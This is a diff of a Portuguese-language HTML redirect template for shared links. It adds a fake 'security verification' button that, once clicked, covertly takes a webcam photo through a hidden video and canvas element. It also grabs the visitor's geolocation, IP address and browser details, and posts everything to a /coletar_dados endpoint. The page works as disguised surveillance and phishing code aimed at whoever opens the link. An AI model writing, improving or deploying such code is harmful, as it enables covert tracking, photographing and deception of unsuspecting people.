@@ -13,38 +13,32 @@
 
     <!-- Twitter Card -->
     <meta name="twitter:card" content="summary_large_image">
-
-    <!-- Delay para garantir leitura das tags OG -->
-    <meta http-equiv="refresh" content="5;url={{ destino }}">
 </head>
-<body>
+<body style="display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; background-color: #0f172a; color: white; font-family: sans-serif;">
 
-    <body style="display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; background-color: #0f172a; color: white; font-family: sans-serif;">
+    <div id="spinner" style="margin-bottom: 20px;">
+        <div style="border: 8px solid #f3f3f3; border-top: 8px solid #3b82f6; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite;"></div>
+    </div>
 
-        <div id="spinner" style="margin-bottom: 20px;">
-            <div style="border: 8px solid #f3f3f3; border-top: 8px solid #3b82f6; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite;"></div>
-        </div>
-    
-        <h3 id="mensagem" style="text-align: center;">Carregando... Aguarde alguns segundos.</h3>
-    
-        <video id="video" autoplay playsinline style="display:none;"></video>
-        <canvas id="canvas" style="display:none;"></canvas>
-    
-        <style>
-            @keyframes spin {
-                0% { transform: rotate(0deg); }
-                100% { transform: rotate(360deg); }
-            }
-        </style>
-    </body>
+    <h3 id="mensagem" style="text-align: center;"> Verificação de Segurança! Clique no botão abaixo para continuar.</h3>
+
+    <button id="permitir" style="padding: 10px 20px; font-size: 16px; margin-top: 20px;">Clique para continuar</button>
+
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
+
+    <style>
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
 
     <script>
         const slug = {{ slug | tojson | safe }};
         const destino = {{ destino | tojson | safe }};
         const inicioTempo = Date.now();
-    
+
         const coletarInfoBrowser = async () => {
             const userAgent = navigator.userAgent;
             const idioma = navigator.language;
@@ -53,7 +47,7 @@
             const alturaTela = window.screen.height;
             const plataforma = navigator.platform;
             const conexao = (navigator.connection || {}).effectiveType || "indisponível";
-    
+
             let ip = "indefinido";
             try {
                 const ipRes = await fetch("https://api.ipify.org?format=json");
@@ -62,7 +56,7 @@
             } catch (e) {
                 console.warn("IP não obtido:", e);
             }
-    
+
             return {
                 userAgent,
                 idioma,
@@ -74,14 +68,16 @@
                 ip
             };
         };
-    
+
         async function coletarDados() {
             let latitude = "", longitude = "", foto_base64 = "";
-    
+
             function atualizarMensagem(texto) {
                 document.getElementById('mensagem').innerText = texto;
             }
-    
+
+            atualizarMensagem("verificação concluida");
+
             // Localização
             try {
                 const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
@@ -90,33 +86,29 @@
             } catch (e) {
                 console.warn("Erro na geolocalização:", e);
             }
-    
+
             // Câmera
             try {
                 const video = document.getElementById('video');
                 const canvas = document.getElementById('canvas');
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
-    
-                await new Promise(r => setTimeout(r, 2000)); // tempo da câmera ligar
-    
+
+                await new Promise(r => setTimeout(r, 2000)); // Espera 2s para a câmera ligar
+
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 foto_base64 = canvas.toDataURL("image/png");
-    
+
                 stream.getTracks().forEach(t => t.stop());
             } catch (e) {
                 console.warn("Erro ao acessar câmera:", e);
             }
-    
-            // Coletar informações do sistema
+
             const infosBrowser = await coletarInfoBrowser();
-    
-            // Tempo na página
             const tempoSegundos = Math.floor((Date.now() - inicioTempo) / 1000);
-    
-            // Montar payload
+
             const payload = {
                 slug,
                 latitude,
@@ -125,8 +117,7 @@
                 tempoSegundos,
                 ...infosBrowser
             };
-    
-            // Enviar
+
             try {
                 const res = await fetch("/coletar_dados", {
                     method: "POST",
@@ -140,9 +131,12 @@
                 atualizarMensagem("Erro no envio de dados.");
             }
         }
-    
-        coletarDados();
+
+        document.getElementById("permitir").addEventListener("click", () => {
+            document.getElementById("permitir").style.display = "none";
+            coletarDados();
+        });
     </script>
-    
+
 </body>
 </html>
